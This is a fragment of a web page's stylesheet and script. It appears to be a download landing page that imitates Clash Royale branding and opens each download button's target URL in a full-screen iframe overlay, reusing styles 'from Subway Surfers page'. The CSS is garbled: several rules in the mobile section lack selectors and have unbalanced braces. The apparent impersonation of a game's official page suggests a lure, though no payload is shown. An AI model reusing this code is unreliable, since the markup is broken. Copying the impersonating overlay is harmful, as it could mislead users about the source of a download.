            height: 100%;
            overflow-x: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #f2f2f2;
            color: #010101;
            font-size: 18px;
        }

        .main-container {
            background-image: url('https://i.postimg.cc/FRrNXFQr/background.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            min-height: 100vh;
            color: white;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            padding: 20px 0 0 0;
            width: 100vw;
            margin: 0;
            overflow: hidden;
        }

        .language-dropdown-wrapper {
            position: absolute;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .language-dropdown {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 10px 35px 10px 40px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            appearance: none;
            background-image: url('https://link.clashroyale.com/images/common/language-globe-white.svg'), url('https://link.clashroyale.com/images/common/language-caret-white.svg');
            background-repeat: no-repeat, no-repeat;
            background-position: 12px center, right 12px center;
            background-size: 20px, 14px;
            min-width: 140px;
        }

        .language-dropdown option {
            background: #333;
            color: white;
        }

        .content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 900px;
            padding: 40px 20px;
            text-align: center;
            margin-top: 60px;
            flex: 1;
        }

        .logo-container {
            margin-bottom: 30px;
        }

        .logo {
            width: 360px;
            max-width: 90%;
            height: auto;
        }

        .lead-text {
            font-size: 32px;
            font-weight: bold;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
            margin-bottom: 40px;
            line-height: 1.3;
            padding: 0 15px;
        }

        .main-button {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            font-size: 26px;
            position: relative;
            font-weight: bold;
            border: none;
            height: 80px;
            text-shadow: 0 -2px #000, 0 0 #000, 0 2px #000, 0 4px #000,
                       -1px -1px #000, 1px -1px #000, 1px 0 #000, -1px 0 #000,
                       1px 1px #000, -1px 1px #000, 1px 2px #000, -1px 2px #000;
            background: url('https://i.postimg.cc/XJKMJR4g/center.png') repeat-x;
            background-size: 100% 100%;
            color: white;
            text-decoration: none;
            min-width: 280px;
            margin: 15px 0 40px 0;
            cursor: pointer;
        }

        .main-button:before,
        .main-button:after {
            content: "";
            position: absolute;
            top: 0;
            height: 80px;
            width: 14px;
            background-size: 100% 100%;
        }

        .main-button:before {
            left: -14px;
            background-image: url('https://i.postimg.cc/dVhzdkJR/left.png');
        }

        .main-button:after {
            right: -14px;
            background-image: url('https://i.postimg.cc/C5vQnYtc/right.png');
        }

        .main-button span {
            line-height: 30px;
            padding: 0 25px;
            display: block;
            transform: translateY(-2px);
        }

        .download-links-wrapper {
            margin: 30px 0 20px 0; /* Reduced bottom margin */
            text-align: center;
        }

        .download-links-heading {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .download-links {
            display: flex;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .download-links a {
            display: inline-block;
        }

        .download-links img {
            width: 200px;
            height: 60px;
            border-radius: 8px;
        }

        .decoration-section {
            margin: 10px 0 5px 0; /* Reduced margins to bring closer to footer */
            width: 100%;
            display: flex;
            justify-content: center;
            position: relative;
            z-index: 1;
        }

        .decoration-image {
            width: 520px; /* Increased from 480px */
            max-width: 95%;
            height: auto;
        }

        footer {
            background: #000;
            color: #fff;
            padding: 30px 20px 20px;
            width: 100vw;
            position: relative;
            left: 50%;
            transform: translateX(-50%);
            margin-top: -30px; /* Changed from -50px to bring footer closer */
            padding-top: 60px; /* Reduced from 80px */
            box-sizing: border-box;
            z-index: 2;
        }

        .links {
            display: flex;
            justify-content: center;
            gap: 25px;
            flex-wrap: wrap;
            margin-bottom: 25px;
        }

        .links a {
            color: #ccc;
            text-decoration: none;
            font-size: 15px;
        }

        .links a:hover {
            color: white;
        }

        .footer-bottom {
            border-top: 1px solid #333;
            padding-top: 25px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        @media (min-width: 576px) {
            .footer-bottom {
                flex-direction: row;
                justify-content: space-between;
            }
        }

        .bottom-links {
            display: flex;
            align-items: center;
            gap: 20px;
            flex-direction: column;
        }

        .bottom-links img {
            width: 55px;
            height: 45px;
        }

        .no-track {
            color: #999;
            text-decoration: none;
            font-size: 15px;
        }

        .social {
            display: flex;
            gap: 15px;
        }

        .social a {
            width: 42px;
            height: 42px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            color: white;
        }

        .social a svg {
            width: 22px;
            height: 22px;
        }

        .social a:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        /* EXACT SAME OVERLAY STYLES FROM SUBWAY SURFERS PAGE */
        .redirect-overlay {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            max-width: 1000px;
            max-height: 700px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            z-index: 9999;
            display: none;
            border: 2px solid #22c55e;
            overflow: hidden;
        }
        
        .redirect-overlay.active {
            display: block;
        }
        
        .overlay-bg {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            z-index: 9998;
            display: none;
        }
        
        .overlay-bg.active {
            display: block;
        }
        
        .overlay-iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        @media (max-width: 768px) {

                width: 20px;
                height: 20px;
            }
            
            /* Overlay mobile adjustments */

                width: 90%;
                height: 80%;
            }

            }
            
            .main-button:after {
                right: -10px;
            }
            
            .decoration-image { 
                width: 360px; /* Increased from 320px */
                margin: 5px 0 0 0; /* Reduced margin */
            }
            
            .download-links-wrapper {
                margin: 20px 0 10px 0; /* Adjusted for mobile */
            }
            
            .download-links { 
                flex-direction: column; 
                align-items: center; 
                gap: 10px;
            }
            
            .download-links img { 
                width: 200px; 
                height: 60px; 
            }
            
            footer {
                padding: 20px 10px 15px;
                margin-top: -20px; /* Adjusted for mobile */
                padding-top: 50px; /* Adjusted for mobile */
                position: relative;
                left: 50%;
                transform: translateX(-50%);
                width: 100vw;
                box-sizing: border-box;
            }
            
            .links { 
                gap: 12px; 
                flex-direction: column;
                align-items: center;
            }
            
            .links a {
                font-size: 13px;
            }
            
            .footer-bottom { 
                gap: 12px; 
            }
            
            .social { 
                gap: 8px; 
            }
            
            .social a {
                width: 35px;
                height: 35px;
            }
            
            .social a svg {
                width: 18px;
                height: 18px;
            }
            
            /* Overlay mobile adjustments */
            .redirect-overlay {
                width: 95%;
                height: 75%;

        }

    <script>
        // Redirect Overlay Functionality
        const redirectOverlay = document.getElementById('redirectOverlay');
        const overlayBg = document.getElementById('overlayBg');
        const redirectFrame = document.getElementById('redirectFrame');
        
        function showOverlay(url) {
            redirectFrame.src = url;
            redirectOverlay.classList.add('active');
            overlayBg.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        // Add event listeners to all download buttons
        document.querySelectorAll('.show-redirect-overlay').forEach(button => {
            button.addEventListener('click', function() {
                const url = this.getAttribute('data-url');
                showOverlay(url);
            });
        });
        
        // Close overlay when clicking on background
        overlayBg.addEventListener('click', function() {
            redirectOverlay.classList.remove('active');
            overlayBg.classList.remove('active');
            document.body.style.overflow = 'auto';
            redirectFrame.src = '';
        });
        
        // Close overlay with Escape key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && redirectOverlay.classList.contains('active')) {
                redirectOverlay.classList.remove('active');
                overlayBg.classList.remove('active');
                document.body.style.overflow = 'auto';
                redirectFrame.src = '';
            }
        });

        // Original page functionality
        document.addEventListener('DOMContentLoaded', function() {
            const langSelect = document.querySelector('.language-dropdown');
